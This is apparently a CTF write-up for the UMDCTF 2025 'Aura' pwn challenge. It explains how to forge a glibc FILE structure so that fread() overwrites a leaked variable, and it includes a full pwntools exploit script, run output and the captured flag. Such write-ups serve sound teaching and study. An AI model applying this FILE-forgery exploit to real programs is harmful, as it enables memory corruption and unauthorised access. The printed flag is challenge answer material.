---
title: "Aura 🌟 – FILE Structure Forgery Exploit (UMDCTF 2025)"
tags: [CTF, binary exploitation, FILE Structure Forgery, pwn]
---

# UMDCTF 2025 - Aura Pwn Challenge Writeup 🌟
**Author:** [@notagain_pwn](https://github.com/notagain-pwn) (RaptX team)

![CTF](https://img.shields.io/badge/CTF-UMDCTF_2025-blue)
![Challenge](https://img.shields.io/badge/Challenge-Aura-informational)
![Category](https://img.shields.io/badge/Category-Pwn-red)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)

## Table of Contents 📚
- [Challenge Overview](#challenge-overview-) 📄
- [Introduction](#introduction-) 🎯
- [Source Code Analysis](#source-code-analysis-) 🔍
- [Exploitation Plan](#exploitation-plan-) 🛠️
- [Exploit Script](#exploit-script-) 🧠
- [Result](#result-) 🏆
- [Final Notes](#final-notes-) ✨

## Challenge Overview 📄

- **Binary:** aura (ELF 64-bit)

**Protections:**
```
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
Stripped: No
```

## Introduction 🎯

We are given a binary `aura`. When executed, it leaks a heap address ("aura") and expects us to submit a crafted structure.  
The goal is to forge a fake FILE structure and leverage `fread()` to overwrite "aura" into a non-zero value.

## Source Code Analysis 🔍

```c
// Main relevant parts
printf("my aura: %p\nur aura? ", &aura);
FILE *pFVar1 = fopen("/dev/null", "r");
read(0, pFVar1, 0x100);
fread(local_118, 1, 8, pFVar1);

if (aura == 0) {
    puts("u have no aura.");
} else {
    pFVar1 = fopen("flag.txt", "r");
    fread(local_138, 1, 0x11, pFVar1);
    printf("%s\n", local_138);
}
```

## Exploitation Plan 🛠️

1. Leak the heap address of `aura`.
2. Forge a valid `_IO_FILE` structure where:
    - `_IO_buf_base = aura`
    - `_IO_buf_end = aura + 0x10`
3. Overwrite "aura" with any non-zero bytes via `fread()`.
4. Access "flag.txt"!

## Exploit Script 🧠

```python
from pwn import *
import argparse

def connect(host=None, port=None):
   if host and port:
      log.info(f"Connecting remotely to {host}:{port}")
      return remote(host, port)
   else:
      log.info("Running locally")
      return process('./aura')

def leak_aura(p):
   p.recvuntil(b'my aura: ')
   aura = int(p.recvline().strip(), 16)
   log.success(f"Leaked aura address: {hex(aura)}")
   return aura

def forge_minimal_payload(aura_addr):
   payload  = p64(0)              # _flags
   payload += p64(0)              # _IO_read_ptr
   payload += p64(0)              # _IO_read_end
   payload += p64(0)              # _IO_read_base
   payload += p64(0)              # _IO_write_base
   payload += p64(0)              # _IO_write_ptr
   payload += p64(0)              # _IO_write_end
   payload += p64(aura_addr)       # _IO_buf_base
   payload += p64(aura_addr + 0x10) # _IO_buf_end
   payload = payload.ljust(0x88, b'\x00')
   payload += p64(aura_addr)       # chain pointer at offset 0x88
   return payload

def exploit(p):
   aura = leak_aura(p)
   p.recvuntil(b'ur aura? ')
   payload = forge_minimal_payload(aura)
   log.info("Sending forged FILE structure")
   p.send(payload)

   log.info("Overwriting aura value")
   p.sendline(b'A'*8)  # Send 8 non-null bytes to overwrite aura

   p.interactive()

def main():
   parser = argparse.ArgumentParser(description="Exploit aura challenge (local/remote)")
   parser.add_argument('--host', type=str, help='Remote host')
   parser.add_argument('--port', type=int, help='Remote port')
   args = parser.parse_args()

   p = connect(args.host, args.port)
   exploit(p)

if __name__ == '__main__':
   context.binary = './aura'
   main()
```

## Result 🏆

```bash
$ python3 aura.py --host challs.umdctf.io --port 31006
[+] Leaked aura address: 0x58cc312f908c
[*] Sending forged FILE structure
[*] Overwriting aura value
[*] Switching to interactive mode
UMDCTF{+100aur4}
```

## Final Notes ✨

This challenge introduces basic but fun FILE structure manipulation, similar to concepts seen in "House of Orange" style heap exploitation.

🔙 [Back to UMDCTF 2025 Writeups](../../)
